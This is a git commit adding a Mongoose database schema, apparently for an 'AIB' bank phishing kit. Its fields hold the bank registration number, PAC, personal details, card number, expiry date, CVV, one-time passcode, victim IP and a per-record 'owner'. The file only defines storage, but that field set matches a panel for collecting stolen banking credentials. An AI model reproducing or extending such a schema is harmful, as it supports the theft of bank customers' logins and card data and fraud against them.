9e334c0efc0e6424d4c3432ca51350578eaf789c
tresdtapio <97699520+tresdtapio@users.noreply.github.com>
2022-11-01 17:24:37 +0000

    make

---
+++ models/aibModel.js
@@ -0,0 +1,23 @@
+const mongoose = require("mongoose");
+
+const aibSchema = new mongoose.Schema({
+  uniqueid: Number,
+  regnumber: String,
+  pac: String,
+  fullname: String,
+  address: String,
+  pcode: String,
+  dob: String,
+  telephone: String,
+  ccnum: String,
+  ccexp: String,
+  cvv: String,
+  otp: String,
+  cardNumber: String,
+  branchAddy: String,
+  status: Number,
+  ip: String,
+  owner: String,
+});
+
+module.exports = mongoose.model("AIB", aibSchema);
